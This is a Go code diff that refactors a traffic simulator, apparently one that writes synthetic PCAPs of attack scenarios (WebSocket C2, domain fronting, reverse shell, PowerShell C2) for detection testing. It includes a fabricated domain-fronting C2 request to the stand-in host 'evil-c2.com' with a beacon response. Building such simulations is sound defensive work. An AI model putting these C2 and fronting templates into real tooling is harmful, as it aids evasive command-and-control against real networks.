@@ -792,14 +792,10 @@ func runWebSocketC2(req AttackRequest) (*AttackResult, error) {
 		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", targetIP, req.AttackerIP, "TCP", flows)
 		result.FlowCount += fc
 		result.EventIDs = append(result.EventIDs, fids...)
-
-		var wsPayload []byte
-		var wsResp []byte
-		for i := 0; i < count; i++ {
-			wsPayload = append(wsPayload, []byte(fmt.Sprintf("ws-frame-%d:%s\n", i+1, randomHexString(32)))...)
-			wsResp = append(wsResp, []byte(fmt.Sprintf("ws-resp-%d:%s\n", i+1, randomHexString(16)))...)
-		}
-		wsPath, wsErr := PCAPTLSExchange(req.RunID, "websocket_c2", targetIP, req.AttackerIP, 443, req.AttackerIP, wsPayload, wsResp)
+		wsPath, wsErr := PCAPTLSExchangeN(req.RunID, "websocket_c2", targetIP, req.AttackerIP, 443, req.AttackerIP,
+			func(i int) []byte { return []byte(fmt.Sprintf("ws-frame-%d:%s\n", i+1, randomHexString(32))) },
+			func(i int) []byte { return []byte(fmt.Sprintf("ws-resp-%d:%s\n", i+1, randomHexString(16))) },
+			count)
 		if wsErr == nil {
 			result.PCAPFiles = append(result.PCAPFiles, wsPath)
 		}
@@ -830,15 +826,14 @@ func runDomainFronting(req AttackRequest) (*AttackResult, error) {
 	fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, frontDomain, "TCP", flows)
 	result.FlowCount += fc
 	result.EventIDs = append(result.EventIDs, fids...)
-
-	var dfPayload []byte
-	for i := 0; i < count; i++ {
-		dfPayload = append(dfPayload, []byte(fmt.Sprintf(
-			"GET /c2/tasks?seq=%d HTTP/1.1\r\nHost: evil-c2.com\r\nX-Forwarded-Host: evil-c2.com\r\nOrigin: https://%s\r\nX-Session: %s\r\n\r\n",
-			i+1, frontDomain, randomHexString(16)))...)
-	}
-	dfResp := []byte("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 27\r\n\r\n{\"cmd\":\"beacon\",\"sleep\":60}")
-	dfPath, dfErr := PCAPTLSExchange(req.RunID, "domain_fronting", req.AttackerIP, frontIP, 443, frontDomain, dfPayload, dfResp)
+	dfPath, dfErr := PCAPTLSExchangeN(req.RunID, "domain_fronting", req.AttackerIP, frontIP, 443, frontDomain,
+		func(i int) []byte {
+			return []byte(fmt.Sprintf("GET /c2/tasks?seq=%d HTTP/1.1\r\nHost: evil-c2.com\r\nX-Forwarded-Host: evil-c2.com\r\nOrigin: https://%s\r\nX-Session: %s\r\n\r\n", i+1, frontDomain, randomHexString(16)))
+		},
+		func(i int) []byte {
+			return []byte("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 27\r\n\r\n{\"cmd\":\"beacon\",\"sleep\":60}")
+		},
+		count)
 	if dfErr == nil {
 		result.PCAPFiles = append(result.PCAPFiles, dfPath)
 	}
@@ -884,12 +879,20 @@ func runReverseShell(req AttackRequest) (*AttackResult, error) {
 			"Linux victim 5.15.0 #1 SMP x86_64 GNU/Linux\n",
 			"flag.txt .ssh .bashrc\n",
 		}
-		var rsPayload, rsResp []byte
-		for i := 0; i < count && i < len(commands); i++ {
-			rsPayload = append(rsPayload, []byte(commands[i])...)
-			rsResp = append(rsResp, []byte(responses[i])...)
-		}
-		rsPath, rsErr := PCAPGenericTCPExchange(req.RunID, "reverse_shell", targetIP, req.AttackerIP, uint16(port), rsPayload, rsResp)
+		rsPath, rsErr := PCAPGenericTCPExchangeN(req.RunID, "reverse_shell", targetIP, req.AttackerIP, uint16(port),
+			func(i int) []byte {
+				if i < len(commands) {
+					return []byte(commands[i])
+				}
+				return []byte(fmt.Sprintf("cmd%d\n", i+1))
+			},
+			func(i int) []byte {
+				if i < len(responses) {
+					return []byte(responses[i])
+				}
+				return []byte(fmt.Sprintf("resp%d\n", i+1))
+			},
+			count)
 		if rsErr == nil {
 			result.PCAPFiles = append(result.PCAPFiles, rsPath)
 		}
@@ -923,13 +926,12 @@ func runPowerShellC2(req AttackRequest) (*AttackResult, error) {
 		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", targetIP, req.AttackerIP, "TCP", flows)
 		result.FlowCount += fc
 		result.EventIDs = append(result.EventIDs, fids...)
-
-		var psPayload []byte
-		for i := 0; i < count; i++ {
-			psPayload = append(psPayload, []byte(fmt.Sprintf("cmd:%s\n", randomHexString(40)))...)
-		}
-		psResp := []byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Length: 24\r\n\r\n%s", randomHexString(24)))
-		psPath, psErr := PCAPTLSExchange(req.RunID, "powershell_c2", targetIP, req.AttackerIP, 443, req.AttackerIP, psPayload, psResp)
+		psPath, psErr := PCAPTLSExchangeN(req.RunID, "powershell_c2", targetIP, req.AttackerIP, 443, req.AttackerIP,
+			func(i int) []byte { return []byte(fmt.Sprintf("cmd-%d:%s\n", i+1, randomHexString(40))) },
+			func(i int) []byte {
+				return []byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Length: 24\r\n\r\n%s", randomHexString(24)))
+			},
+			count)
 		if psErr == nil {
 			result.PCAPFiles = append(result.PCAPFiles, psPath)
 		}
